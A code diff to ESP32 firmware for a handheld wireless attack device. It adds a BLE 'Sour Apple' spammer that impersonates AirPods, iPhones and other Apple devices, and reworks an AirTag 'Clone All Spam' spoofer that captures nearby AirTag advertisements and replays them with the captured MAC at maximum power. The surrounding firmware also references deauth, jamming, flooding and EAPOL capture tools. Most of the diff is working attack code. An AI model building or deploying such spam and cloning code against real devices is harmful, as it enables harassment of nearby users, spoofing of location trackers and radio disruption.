@@ -67,6 +67,8 @@ static void karmaStop();
 
 static void eapolUpdate();
 static void sourUpdate();
+static void sourDevUpdate();
+static void sourDevStop();
 static void jamUpdate();
 static void spoofUpdate();
 static void airSpoofUpdate();
@@ -83,7 +85,8 @@ static void menuEnsureVisible(int sel, int& top, int count, int rows = 5) {
 }
 
 
-// ---- Radio ownership mutex (Wave 1) ----
+// ---- Global 2.4 GHz radio arbiter (classic ESP32 = ONE shared RF) ----
+// Wi-Fi domain and BLE domain are mutually exclusive.
 enum RadioOwner : uint8_t {
   RADIO_NONE = 0,
   RADIO_WIFI_SCAN = 1,
@@ -93,20 +96,49 @@ enum RadioOwner : uint8_t {
 };
 static volatile uint8_t radioOwner = RADIO_NONE;
 
+static inline bool radioIsWifi(uint8_t o) {
+  return o == RADIO_WIFI_SCAN || o == RADIO_WIFI_TX;
+}
+static inline bool radioIsBle(uint8_t o) {
+  return o == RADIO_BLE_SCAN || o == RADIO_BLE_ADV;
+}
+
+static void bleForceIdle();
+static void wifiForceIdle();
+
 static bool radioAcquire(uint8_t want) {
-  if (radioOwner == RADIO_NONE || radioOwner == want) {
+  portENTER_CRITICAL(&radioMux);
+  uint8_t cur = radioOwner;
+  if (cur == RADIO_NONE || cur == want) {
     radioOwner = want;
+    portEXIT_CRITICAL(&radioMux);
     return true;
   }
-  if (want == RADIO_WIFI_SCAN && radioOwner == RADIO_WIFI_TX) return false;
-  if (want == RADIO_WIFI_TX && radioOwner == RADIO_WIFI_SCAN) return false;
-  if (want == RADIO_BLE_SCAN && radioOwner == RADIO_BLE_ADV) return false;
-  if (want == RADIO_BLE_ADV && radioOwner == RADIO_BLE_SCAN) return false;
+  // Same domain, different role → deny
+  if (radioIsWifi(cur) && radioIsWifi(want) && cur != want) {
+    portEXIT_CRITICAL(&radioMux);
+    return false;
+  }
+  if (radioIsBle(cur) && radioIsBle(want) && cur != want) {
+    portEXIT_CRITICAL(&radioMux);
+    return false;
+  }
+  portEXIT_CRITICAL(&radioMux);
+
+  // Cross-domain: tear down the other subsystem, then claim
+  if (radioIsWifi(cur) && radioIsBle(want)) wifiForceIdle();
+  else if (radioIsBle(cur) && radioIsWifi(want)) bleForceIdle();
+
+  portENTER_CRITICAL(&radioMux);
   radioOwner = want;
+  portEXIT_CRITICAL(&radioMux);
   return true;
 }
+
 static void radioRelease(uint8_t own) {
+  portENTER_CRITICAL(&radioMux);
   if (radioOwner == own) radioOwner = RADIO_NONE;
+  portEXIT_CRITICAL(&radioMux);
 }
 
 // Tool activity flags (early for dual-core workers)
@@ -118,6 +150,7 @@ static bool karmaRunning = false;
 static bool floodRunning = false;
 static bool eapolRunning = false;
 static bool sourRunning = false;
+static bool sourDevRunning = false;
 static bool jamRunning = false;
 static bool spoofRunning = false;
 static bool airSpoofRunning = false;
@@ -590,6 +623,11 @@ static void floodUpdate() {
 // Dual-core workers
 static void wifiCoreLoop(void* arg) {
   for (;;) {
+    // Shared RF: skip Wi-Fi TX while BLE owns the radio
+    if (radioIsBle(radioOwner)) {
+      vTaskDelay(1);
+      continue;
+    }
     // Option C: Wi-Fi TX on this core; UI on the other. Always yield 1 tick.
     if (floodRunning) {
       // Jam path: one full burst per schedule, then vTaskDelay(1)
@@ -612,8 +650,14 @@ static void wifiCoreLoop(void* arg) {
 
 static void bleCoreLoop(void* arg) {
   for (;;) {
-    if (sourRunning || jamRunning || spoofRunning || airSpoofRunning) {
+    // Shared RF: skip BLE ADV workers while Wi-Fi owns the radio
+    if (radioIsWifi(radioOwner)) {
+      vTaskDelay(1);
+      continue;
+    }
+    if (sourRunning || sourDevRunning || jamRunning || spoofRunning || airSpoofRunning) {
       if (sourRunning) sourUpdate();
+      if (sourDevRunning) sourDevUpdate();
       if (jamRunning) jamUpdate();
       if (spoofRunning) spoofUpdate();
       if (airSpoofRunning) airSpoofUpdate();
@@ -1761,6 +1805,7 @@ static void stopAllTools() {
   captiveStop();
   sniffStop();
   spoofStop();
+  sourDevStop();
   sourStop();
   jamStop();
   airTagStop();
@@ -1827,6 +1872,36 @@ static esp_ble_adv_params_t bleAdvPendingParams;
 static uint8_t bleAdvPendingData[31];
 static uint8_t bleAdvPendingLen = 0;
 
+// Tear down Wi-Fi activity so BLE can own the single RF path
+static void wifiForceIdle() {
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+  if (!webMode) {
+    WiFi.softAPdisconnect(true);
+    WiFi.disconnect(true, false);
+    WiFi.mode(WIFI_STA);
+  } else {
+    // Keep Soft-AP association path minimal under web mode
+    WiFi.disconnect(false, false);
+  }
+  delay(30);
+}
+
+// Tear down BLE scan/ADV so Wi-Fi can own the RF path
+static void bleForceIdle() {
+  esp_ble_gap_stop_scanning();
+  esp_ble_gap_stop_advertising();
+  bleScanning = false;
+  bleScanStartPending = false;
+  bleScanDone = true;
+  bleAdvPendingStart = false;
+  bleAdvBusy = false;
+  // Wait for controller; GAP STOP events will also clear flags
+  delay(50);
+}
+
+
+
 // Wi-Fi mode saved while BLE owns the antenna (WROOM coexistence)
 static wifi_mode_t bleSavedWifiMode = WIFI_MODE_STA;
 static bool        bleWifiPaused = false;
@@ -1879,6 +1954,41 @@ static void bleResumeWifiAfterScan() {
   } else {
     WiFi.mode(WIFI_STA);
     WiFi.disconnect(false, false);
+  }
+}
+
+
+static void bleProcessAdv(uint8_t *bda, int rssi, uint8_t *payload, uint8_t plen);
+
+// ---- Minimal GAP RX queue (callback must stay short) ----
+#define BLE_RXQ_DEPTH 32
+struct BleRxItem {
+  uint8_t  bda[6];
+  int8_t   rssi;
+  uint8_t  len;
+  uint8_t  data[62];
+};
+static BleRxItem bleRxQ[BLE_RXQ_DEPTH];
+static volatile uint8_t bleRxHead = 0;
+static volatile uint8_t bleRxTail = 0;
+
+static bool bleRxPush(const uint8_t* bda, int8_t rssi, const uint8_t* data, uint8_t len) {
+  uint8_t next = (uint8_t)((bleRxHead + 1) % BLE_RXQ_DEPTH);
+  if (next == bleRxTail) return false;  // drop if full
+  BleRxItem& it = bleRxQ[bleRxHead];
+  memcpy(it.bda, bda, 6);
+  it.rssi = rssi;
+  it.len = len > 62 ? 62 : len;
+  if (data && it.len) memcpy(it.data, data, it.len);
+  bleRxHead = next;
+  return true;
+}
+
+static void bleRxDrain() {
+  while (bleRxTail != bleRxHead) {
+    BleRxItem& it = bleRxQ[bleRxTail];
+    bleProcessAdv(it.bda, it.rssi, it.data, it.len);
+    bleRxTail = (uint8_t)((bleRxTail + 1) % BLE_RXQ_DEPTH);
   }
 }
 
@@ -2043,11 +2153,14 @@ static void bleGapCb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param
       switch (param->scan_rst.search_evt) {
         case ESP_GAP_SEARCH_INQ_RES_EVT: {
           blePktCount++;
-          // Official uses adv_data_len only for packet body
-          uint8_t alen = param->scan_rst.adv_data_len;
-          if (alen > 62) alen = 62;
-          bleProcessAdv(param->scan_rst.bda, param->scan_rst.rssi,
-                         param->scan_rst.ble_adv, alen);
+          // ADV + optional scan response (active scan)
+          uint16_t total = param->scan_rst.adv_data_len;
+          if (param->scan_rst.scan_rsp_len)
+            total = (uint16_t)(total + param->scan_rst.scan_rsp_len);
+          if (total > 62) total = 62;
+          // Queue only — parse on main/UI path
+          bleRxPush(param->scan_rst.bda, (int8_t)param->scan_rst.rssi,
+                    param->scan_rst.ble_adv, (uint8_t)total);
           break;
         }
         case ESP_GAP_SEARCH_INQ_CMPL_EVT:
@@ -2062,6 +2175,7 @@ static void bleGapCb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param
     }
 
     case ESP_GAP_BLE_SCAN_STOP_COMPLETE_EVT:
+      // Authoritative: only GAP confirms stop
       bleScanning = false;
       bleScanDone = true;
       bleScanStartPending = false;
@@ -2112,33 +2226,49 @@ static esp_ble_scan_params_t bleScanParams = {
 };
 
 
-// Stop scan + install raw ADV, start on ADV_DATA_RAW_SET_COMPLETE (ibeacon style)
+// nyanBOX-style ADV: stop scan → set_rand_addr → config_raw → delay → start
+// AirTag spoof MUST use RANDOM addr (MAC carries public-key bits).
 static void bleEnsureNotScanning() {
-  // Always issue stop — continuous AirTag scan may leave flags inconsistent
-  esp_ble_gap_stop_scanning();
-  bleScanning = false;
-  bleScanStartPending = false;
-  bleScanDone = true;
-  delay(50);
+  // Request stop; flags cleared on SCAN_STOP_COMPLETE (and timeout fallback)
+  if (bleScanning || bleScanStartPending) {
+    esp_ble_gap_stop_scanning();
+    bleScanStartPending = false;
+    // Soft timeout so we don't block forever if STOP_COMPLETE is lost
+    uint32_t t0 = millis();
+    while (bleScanning && (millis() - t0) < 80)
+      delay(5);
+    bleScanning = false;
+    bleScanDone = true;
+  }
 }
 
-static void bleAdvStartRaw(const uint8_t* data, uint8_t len, const esp_ble_adv_params_t* params) {
+// mac: if non-NULL and useRandom, set as static random addr before ADV
+static void bleAdvStartRawEx(const uint8_t* data, uint8_t len,
+                             const esp_ble_adv_params_t* params,
+                             const uint8_t mac[6], bool useRandom) {
   if (!data || len == 0 || len > 31 || !params) return;
   if (!bleReady) { bleInit(); if (!bleReady) return; }
-
-  // Previous cycle still running — skip this tick
   if (bleAdvPendingStart || bleAdvBusy) return;
 
   bleEnsureNotScanning();
 
-  // Force PUBLIC for WROOM reliability (RANDOM needs async set_rand_addr)
   esp_ble_adv_params_t p = *params;
-  p.own_addr_type = BLE_ADDR_TYPE_PUBLIC;
-  p.adv_type = ADV_TYPE_NONCONN_IND;
   p.channel_map = ADV_CHNL_ALL;
   p.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
   if (p.adv_int_min < 0x20) p.adv_int_min = 0x20;
-  if (p.adv_int_max < p.adv_int_min) p.adv_int_max = p.adv_int_min;
+  if (p.adv_int_max < p.adv_int_min) p.adv_int_max = (uint16_t)(p.adv_int_min + 0x20);
+
+  if (useRandom && mac) {
+    p.own_addr_type = BLE_ADDR_TYPE_RANDOM;
+    uint8_t addr[6];
+    memcpy(addr, mac, 6);
+    // Static random: two MSBs of first octet must be 1 (BT Core Spec)
+    addr[0] = (uint8_t)((addr[0] & 0x3F) | 0xC0);
+    esp_ble_gap_set_rand_addr(addr);
+    delay(50);  // nyanBOX BLE spoofer waits 50ms after set_rand_addr
+  } else {
+    p.own_addr_type = BLE_ADDR_TYPE_PUBLIC;
+  }
 
   memcpy(bleAdvPendingData, data, len);
   bleAdvPendingLen = len;
@@ -2148,7 +2278,7 @@ static void bleAdvStartRaw(const uint8_t* data, uint8_t len, const esp_ble_adv_p
   bleAdvBusy = true;
 
   esp_ble_gap_stop_advertising();
-  delay(20);
+  delay(50);  // nyanBOX ble_spoofer stop→config spacing
 
   esp_err_t e = esp_ble_gap_config_adv_data_raw(bleAdvPendingData, bleAdvPendingLen);
   if (e != ESP_OK) {
@@ -2157,7 +2287,23 @@ static void bleAdvStartRaw(const uint8_t* data, uint8_t len, const esp_ble_adv_p
     bleAdvBusy = false;
     return;
   }
-  // start_advertising in GAP: ADV_DATA_RAW_SET_COMPLETE_EVT
+  delay(20);  // nyanBOX: delay after config_adv_data_raw
+
+  // nyanBOX airtag_spoofer: start after short delay (also handled by
+  // ADV_DATA_RAW_SET_COMPLETE if it fires first)
+  delay(10);
+  if (bleAdvPendingStart) {
+    bleAdvPendingStart = false;
+    e = esp_ble_gap_start_advertising(&bleAdvPendingParams);
+    if (e != ESP_OK) {
+      Serial.printf("[BLE] start_advertising fail %s\n", esp_err_to_name(e));
+      bleAdvBusy = false;
+    }
+  }
+}
+
+static void bleAdvStartRaw(const uint8_t* data, uint8_t len, const esp_ble_adv_params_t* params) {
+  bleAdvStartRawEx(data, len, params, nullptr, false);
 }
 
 static void airSpoofStop();
@@ -2218,6 +2364,7 @@ static void bleScanStart() {
 }
 
 static void bleScanUpdate() {
+  bleRxDrain();
   if (!bleScanning && !bleScanDone && !bleScanStartPending) return;
 
   // Finite-duration timeout
@@ -2523,8 +2670,36 @@ static const AppleType appleList[] = {
 static const int APPLE_LIST_COUNT = sizeof(appleList) / sizeof(appleList[0]);
 
 static int      sourSelected = 0;    // index into appleList / SOUR_ACTION_TYPES
-static uint32_t sourLast = 0;
-static uint32_t sourSent = 0;
+
+// Sour Apple category submenu
+static const char* const SOUR_CAT_ITEMS[] = {
+  "Continuity alerts",
+  "Device-style ads",
+  "Back"
+};
+static const int SOUR_CAT_COUNT = 3;
+
+// Device-style name advertisements (not Continuity popups)
+struct SourDeviceTpl {
+  const char* name;
+  // Simple flags + complete local name ADV (device appearance on scanners)
+};
+static const char* const SOUR_DEV_NAMES[] = {
+  "AirPods Pro",
+  "AirPods Max",
+  "Apple Watch",
+  "iPhone",
+  "iPad",
+  "MacBook Pro",
+  "Apple TV",
+  "HomePod",
+  "Clone BLE scan…",  // jumps to BLE Spoofer
+  "Back"
+};
+static const int SOUR_DEV_COUNT = 10;
+static int sourDevSelected = 0;
+static uint32_t sourDevLast = 0;
+static uint32_t sourDevSent = 0;
 
 static esp_ble_adv_params_t sourAdvParams = {
   .adv_int_min = 0x20,
@@ -2534,6 +2709,55 @@ static esp_ble_adv_params_t sourAdvParams = {
   .channel_map = ADV_CHNL_ALL,
   .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
 };
+
+static void sourDevStop() {
+  if (!sourDevRunning) return;
+  sourDevRunning = false;
+  esp_ble_gap_stop_advertising();
+  radioRelease(RADIO_BLE_ADV);
+}
+
+static void sourDevBuildNameAdv(uint8_t* packet, uint8_t* plen, const char* nm) {
+  // Flags (LE General Discoverable) + Complete Local Name
+  size_t nl = nm ? strnlen(nm, 26) : 0;
+  packet[0] = 0x02; packet[1] = 0x01; packet[2] = 0x06;
+  packet[3] = (uint8_t)(nl + 1);
+  packet[4] = 0x09;  // Complete Local Name
+  if (nl) memcpy(packet + 5, nm, nl);
+  *plen = (uint8_t)(5 + nl);
+}
+
+static void sourDevBegin() {
+  if (sourDevSelected < 0 || sourDevSelected >= 8) return;  // 0..7 are templates
+  sourStop();
+  sniffStop(); spoofStop(); jamStop(); airSpoofStop();
+  bleEnsureNotScanning();
+  radioAcquire(RADIO_BLE_ADV);
+  bleInit();
+  if (!bleReady) { radioRelease(RADIO_BLE_ADV); return; }
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+  sourDevRunning = true;
+  sourDevLast = 0;
+  sourDevSent = 0;
+}
+
+static void sourDevUpdate() {
+  if (!sourDevRunning) return;
+  if (millis() - sourDevLast < 100) return;
+  sourDevLast = millis();
+  sourDevSent++;
+  if (!bleReady) return;
+  uint8_t packet[31];
+  uint8_t plen = 0;
+  const char* nm = SOUR_DEV_NAMES[sourDevSelected];
+  sourDevBuildNameAdv(packet, &plen, nm);
+  bleAdvStartRaw(packet, plen, &sourAdvParams);
+}
+
+
+static uint32_t sourLast = 0;
+static uint32_t sourSent = 0;
 
 // Exact 17-byte Continuity packet from RapierXbox ESP32-Sour-Apple
 static void sourBuildPacket(uint8_t* packet, uint8_t* plen, int typeIdx) {
@@ -2622,6 +2846,8 @@ static void sourUpdate() {
 
 // ============================================================
 //  AirTag Detector + Spoofer (Bluedroid / nyanBOX-style)
+//  Spoof = advertisement REPLAY research (MAC + raw ADV). Not certified
+//  AirTag hardware emulation / Find My cloud identity guarantee.
 // ============================================================
 #define AIRTAG_MAX 48
 
@@ -2650,27 +2876,17 @@ static int       airMenuSel = 0;
 static int       uiSelAir() { return airMenuSel; }
 
 // Identify Apple Offline Finding / Find My (AirTag family) by walking AD structs
+// nyanBOX airtag_detector.cpp isAirTagPayload — exact match
 static bool isAirTagPayload(const uint8_t* payload, uint8_t len) {
   if (!payload || len < 4) return false;
-  uint8_t i = 0;
-  while (i < len) {
-    uint8_t adlen = payload[i];
-    if (adlen == 0) break;
-    if ((uint16_t)i + 1 + adlen > len) break;
-    uint8_t typ = payload[i + 1];
-    if (typ == 0xFF && adlen >= 4) {
-      // Company ID Apple 0x004C (little-endian)
-      if (payload[i + 2] == 0x4C && payload[i + 3] == 0x00) {
-        uint8_t appleType = payload[i + 4];  // first byte after company ID
-        // 0x12 = Offline Finding (AirTags, Find My network)
-        if (appleType == 0x12) return true;
-      }
-    }
-    i = (uint8_t)(i + adlen + 1);
+  for (int i = 0; i <= (int)len - 4; i++) {
+    if (payload[i] == 0x1E && payload[i + 1] == 0xFF &&
+        payload[i + 2] == 0x4C && payload[i + 3] == 0x00)
+      return true;
+    if (payload[i] == 0x4C && payload[i + 1] == 0x00 &&
+        payload[i + 2] == 0x12 && payload[i + 3] == 0x19)
+      return true;
   }
-  // Also accept bare mfg blob that starts with 4C 00 12 (no AD framing)
-  if (len >= 3 && payload[0] == 0x4C && payload[1] == 0x00 && payload[2] == 0x12)
-    return true;
   return false;
 }
 
@@ -2711,22 +2927,41 @@ static void airDetHarvestFromBleList() {
     }
     if (!match) continue;
 
-    int idx = airTagFindAddr(bleDevs[i].addr);
+    // Prefer match by payload fingerprint (addr rotates on privacy devices)
+    int idx = -1;
+    if (blen >= 8) {
+      for (int k = 0; k < airTagCount; k++) {
+        if (airTags[k].payloadLen >= 8 &&
+            airTags[k].payloadLen == (blen > 31 ? 31 : blen) &&
+            memcmp(airTags[k].payload, buf, 8) == 0) {
+          idx = k;
+          break;
+        }
+      }
+    }
+    if (idx < 0) idx = airTagFindAddr(bleDevs[i].addr);
     if (idx < 0) {
       if (airTagCount >= AIRTAG_MAX) continue;
       idx = airTagCount++;
-      strncpy(airTags[idx].addr, bleDevs[i].addr, 17);
-      airTags[idx].addr[17] = 0;
       strcpy(airTags[idx].name, "AirTag");
     }
+    // Always refresh current address (may have rotated)
+    strncpy(airTags[idx].addr, bleDevs[i].addr, 17);
+    airTags[idx].addr[17] = 0;
     airTags[idx].rssi = (int8_t)bleDevs[i].rssi;
     airTags[idx].lastSeen = now;
-    if (blen > 0 && blen < 62) {
-      memcpy(airTags[idx].payload, buf, blen);
-      airTags[idx].payloadLen = blen;
+    // Store exact ADV for 1:1 clone (cap 31 for legacy ADV; nyanBOX stores up to 64)
+    if (blen > 0) {
+      uint8_t clen = blen > 31 ? 31 : blen;
+      memcpy(airTags[idx].payload, buf, clen);
+      airTags[idx].payloadLen = clen;
     } else if (bleDevs[i].mfgLen > 0) {
-      memcpy(airTags[idx].payload, bleDevs[i].mfg, bleDevs[i].mfgLen);
-      airTags[idx].payloadLen = bleDevs[i].mfgLen;
+      // Rebuild AD framing if we only have mfg blob
+      uint8_t mlen = bleDevs[i].mfgLen > 29 ? 29 : bleDevs[i].mfgLen;
+      airTags[idx].payload[0] = (uint8_t)(mlen + 1);
+      airTags[idx].payload[1] = 0xFF;
+      memcpy(airTags[idx].payload + 2, bleDevs[i].mfg, mlen);
+      airTags[idx].payloadLen = (uint8_t)(mlen + 2);
     }
     if (bleDevs[i].name[0]) {
       strncpy(airTags[idx].name, bleDevs[i].name, 23);
@@ -2773,6 +3008,7 @@ static void airDetStop() {
 
 static void airDetUpdate() {
   if (!airDetRunning) return;
+  bleRxDrain();
   // Continuous scan: harvest from live bleDevs; restart via state machine if needed
   if (millis() - airDetLast > 800) {
     airDetLast = millis();
@@ -2794,11 +3030,12 @@ static bool parseMacStr(const char* s, uint8_t out[6]) {
   return true;
 }
 
+// nyanBOX airtag_spoofer.cpp adv_params
 static esp_ble_adv_params_t airAdvParams = {
-  .adv_int_min = 0x15,
-  .adv_int_max = 0x25,
+  .adv_int_min = 0x20,
+  .adv_int_max = 0x40,
   .adv_type = ADV_TYPE_NONCONN_IND,
-  .own_addr_type = BLE_ADDR_TYPE_PUBLIC,
+  .own_addr_type = BLE_ADDR_TYPE_RANDOM,  // MAC carries Find My key bits
   .channel_map = ADV_CHNL_ALL,
   .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
 };
@@ -2821,44 +3058,69 @@ static void airSpoofStart(int targetIdx) {
   radioAcquire(RADIO_BLE_ADV);
   bleInit();
   if (!bleReady) { radioRelease(RADIO_BLE_ADV); return; }
+  // nyanBOX ble_spammer: max TX on all BLE power domains
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
-  airSpoofTarget = targetIdx;  // -1 = clone all rotator
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
+  airSpoofTarget = targetIdx;  // -1 = clone all (nyanBOX "Clone All Spam")
   airSpoofIdx = (targetIdx >= 0) ? targetIdx : 0;
   airSpoofRunning = true;
   airTagRunning = true;
   airTagMode = 2;
   airSpoofLast = 0;
   airTagSent = 0;
+  bleAdvBusy = false;
+  bleAdvPendingStart = false;
 }
 
+// nyanBOX airtag_spoofer:
+//  - single clone: refresh every 100ms (stop 5ms, restart)
+//  - clone all:    rotate every 10ms (advertiseInterval)
+//  - set_rand_addr(captured MAC) + exact payload + RANDOM ADV
 static void airSpoofUpdate() {
   if (!airSpoofRunning) return;
   if (airTagCount <= 0) { airSpoofStop(); return; }
-  if (millis() - airSpoofLast < 100) return;  // allow GAP ADV complete cycle
+
+  // nyanBOX: single=100ms, clone-all=10ms
+  const uint32_t interval = (airSpoofTarget < 0) ? 10UL : 100UL;
+  if (millis() - airSpoofLast < interval) return;
   airSpoofLast = millis();
   airTagSent++;
-  bleInit();
-  if (!bleReady) return;
+  if (!bleReady) { bleInit(); if (!bleReady) return; }
+
+  // Stop current ADV before reconfig (nyanBOX stopAdvertising)
+  esp_ble_gap_stop_advertising();
+  delay(5);
+  bleAdvBusy = false;
+  bleAdvPendingStart = false;
 
   int idx;
-  if (airSpoofTarget >= 0 && airSpoofTarget < airTagCount) idx = airSpoofTarget;
-  else {
-    idx = airSpoofIdx % airTagCount;
+  if (airSpoofTarget >= 0 && airSpoofTarget < airTagCount) {
+    idx = airSpoofTarget;  // Clone Target
+  } else {
+    idx = airSpoofIdx % airTagCount;  // Clone All Spam
     airSpoofIdx = (airSpoofIdx + 1) % airTagCount;
   }
 
   AirTagDev& d = airTags[idx];
+  // Prefer exact captured ADV; only synthesize if nothing stored
   if (d.payloadLen < 4) {
     uint8_t pkt[31];
     pkt[0] = 0x1E; pkt[1] = 0xFF; pkt[2] = 0x4C; pkt[3] = 0x00;
-    pkt[4] = 0x12; pkt[5] = 0x19; pkt[6] = 0x00;
-    for (int i = 7; i < 31; i++) pkt[i] = (uint8_t)esp_random();
+    pkt[4] = 0x12; pkt[5] = 0x19;
+    for (int i = 6; i < 31; i++) pkt[i] = (uint8_t)esp_random();
     memcpy(d.payload, pkt, 31);
     d.payloadLen = 31;
   }
+  if (d.payloadLen > 31) d.payloadLen = 31;
 
-  if (d.payloadLen < 4) return;
-  bleAdvStartRaw(d.payload, d.payloadLen, &airAdvParams);
+  uint8_t mac[6];
+  if (!parseMacStr(d.addr, mac)) {
+    mac[0] = (uint8_t)((esp_random() & 0x3F) | 0xC0);
+    for (int i = 1; i < 6; i++) mac[i] = (uint8_t)esp_random();
+  }
+
+  bleAdvStartRawEx(d.payload, d.payloadLen, &airAdvParams, mac, true);
 }
 
 static void airTagStart() {
@@ -4107,10 +4369,19 @@ void UI::enterScreen(Screen s) {
   if (s == SCR_BLE_SNIFF)  sniffStart();
   if (s == SCR_BLE_SPOOF)  { spoofStop(); }
   if (s == SCR_SOUR_APPLE) {
-    sourStart();
+    sourStop();
+    sourDevStop();
+    _sel = 0; _top = 0;
+  }
+  if (s == SCR_SOUR_NOTIF) {
+    sourDevStop();
     if (sourSelected < 0) sourSelected = 0;
     _sel = sourSelected;
-    if (_sel >= 6) _top = _sel - 5;
+    if (_sel >= 5) _top = _sel - 4;
+  }
+  if (s == SCR_SOUR_DEVICES) {
+    sourStop();
+    _sel = 0; _top = 0;
   }
   if (s == SCR_BLE_JAM)    { jamStop(); }
   if (s == SCR_AIRTAG)     { airTagStart(); airMenuSel = 0; }
@@ -4119,7 +4390,7 @@ void UI::enterScreen(Screen s) {
 void UI::goBack() {
   wifiScanDetail = false;
   pmStop(); beaconStop(); detStop(); deauthStop(); clientSniffStop(); probeStop(); captiveStop();
-  sniffStop(); spoofStop(); sourStop(); jamStop(); airTagStop();
+  sniffStop(); spoofStop(); sourStop(); sourDevStop(); jamStop(); airTagStop();
 
   switch (_screen) {
     case SCR_WIFI_MENU: case SCR_BLE_MENU:
@@ -4131,6 +4402,8 @@ void UI::goBack() {
     case SCR_BLE_SCAN: case SCR_BLE_SNIFF: case SCR_BLE_SPOOF:
     case SCR_SOUR_APPLE: case SCR_BLE_JAM: case SCR_AIRTAG:
       enterScreen(SCR_BLE_MENU); break;
+    case SCR_SOUR_NOTIF: case SCR_SOUR_DEVICES:
+      enterScreen(SCR_SOUR_APPLE); break;
     default:
       enterScreen(SCR_MAIN); break;
   }
@@ -4392,8 +4665,22 @@ void UI::handleInput(JoyAction a) {
     return;
   }
 
-  // Sour Apple – pick Continuity action type, then spam
+  // Sour Apple – category menu
   if (_screen == SCR_SOUR_APPLE) {
+    if (a == JOY_UP || a == JOY_HOLD_UP) {
+      if (_sel > 0) { _sel--; _dirty = true; }
+    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
+      if (_sel < SOUR_CAT_COUNT - 1) { _sel++; _dirty = true; }
+    } else if (a == JOY_SELECT) {
+      if (_sel == 0) enterScreen(SCR_SOUR_NOTIF);
+      else if (_sel == 1) enterScreen(SCR_SOUR_DEVICES);
+      else goBack();
+    } else if (a == JOY_BACK) goBack();
+    return;
+  }
+
+  // Continuity notifications (action types)
+  if (_screen == SCR_SOUR_NOTIF) {
     const int sourMenuCount = APPLE_LIST_COUNT;
     if (sourRunning) {
       if (a == JOY_BACK || a == JOY_SELECT) { sourStop(); _dirty = true; }
@@ -4402,11 +4689,35 @@ void UI::handleInput(JoyAction a) {
     if (a == JOY_UP || a == JOY_HOLD_UP) {
       if (_sel > 0) { _sel--; menuEnsureVisible(_sel, _top, sourMenuCount, 5); _dirty = true; }
     } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
-      if (_sel < sourMenuCount-1) { _sel++; menuEnsureVisible(_sel, _top, sourMenuCount, 5); _dirty = true; }
+      if (_sel < sourMenuCount - 1) { _sel++; menuEnsureVisible(_sel, _top, sourMenuCount, 5); _dirty = true; }
     } else if (a == JOY_SELECT) {
       sourSelected = _sel;
       sourBeginAdvertise();
       _dirty = true;
+    } else if (a == JOY_BACK) goBack();
+    return;
+  }
+
+  // Device-style ads
+  if (_screen == SCR_SOUR_DEVICES) {
+    if (sourDevRunning) {
+      if (a == JOY_BACK || a == JOY_SELECT) { sourDevStop(); _dirty = true; }
+      return;
+    }
+    if (a == JOY_UP || a == JOY_HOLD_UP) {
+      if (_sel > 0) { _sel--; menuEnsureVisible(_sel, _top, SOUR_DEV_COUNT, 5); _dirty = true; }
+    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
+      if (_sel < SOUR_DEV_COUNT - 1) { _sel++; menuEnsureVisible(_sel, _top, SOUR_DEV_COUNT, 5); _dirty = true; }
+    } else if (a == JOY_SELECT) {
+      if (_sel == SOUR_DEV_COUNT - 1) goBack();  // Back
+      else if (_sel == SOUR_DEV_COUNT - 2) {
+        // Clone BLE scan → existing spoofer
+        enterScreen(SCR_BLE_SPOOF);
+      } else {
+        sourDevSelected = _sel;
+        sourDevBegin();
+        _dirty = true;
+      }
     } else if (a == JOY_BACK) goBack();
     return;
   }
@@ -4894,7 +5205,14 @@ static void drawWarScreen() {
 
 
 static void drawSourAppleList(int sel, int top) {
+  // Category root
   Theme::drawStatusBar("Sour Apple");
+  Theme::drawMenuList(SOUR_CAT_ITEMS, SOUR_CAT_COUNT, sel, 0);
+  drawActivityFooter();
+}
+
+static void drawSourNotifScreen(int sel, int top) {
+  Theme::drawStatusBar("Continuity");
   if (sourRunning) {
     Theme::printCentered("SPAMMING", 36, COL_OK, 1);
     const char* nm = (sourSelected >= 0 && sourSelected < APPLE_LIST_COUNT)
@@ -4906,10 +5224,25 @@ static void drawSourAppleList(int sel, int top) {
     drawActivityFooter();
     return;
   }
-  static const char* names[40];
+  static const char* names[16];
   int n = 0;
-  for (int i = 0; i < APPLE_LIST_COUNT && n < 40; i++) names[n++] = appleList[i].name;
-  Theme::drawMenuList(names, n, sel, top, 18, 14);
+  for (int i = 0; i < APPLE_LIST_COUNT && n < 16; i++) names[n++] = appleList[i].name;
+  Theme::drawMenuList(names, n, sel, top);
+  drawActivityFooter();
+}
+
+static void drawSourDevicesScreen(int sel, int top) {
+  Theme::drawStatusBar("Device ads");
+  if (sourDevRunning) {
+    Theme::printCentered("ADVERTISING", 36, COL_OK, 1);
+    Theme::printCentered(SOUR_DEV_NAMES[sourDevSelected], 52, COL_FG, 1);
+    char buf[28];
+    snprintf(buf, sizeof(buf), "%lu pkts", (unsigned long)sourDevSent);
+    Theme::printCentered(buf, 68, COL_DIM, 1);
+    drawActivityFooter();
+    return;
+  }
+  Theme::drawMenuList(SOUR_DEV_NAMES, SOUR_DEV_COUNT, sel, top);
   drawActivityFooter();
 }
 
@@ -5006,6 +5339,8 @@ void UI::drawCurrent() {
     case SCR_EAPOL:      drawEapolScreen(); break;
     case SCR_WAR:        drawWarScreen(); break;
     case SCR_SOUR_APPLE:  drawSourAppleList(_sel, _top); break;
+    case SCR_SOUR_NOTIF:  drawSourNotifScreen(_sel, _top); break;
+    case SCR_SOUR_DEVICES: drawSourDevicesScreen(_sel, _top); break;
     case SCR_BLE_JAM:     drawJamScreen(); break;
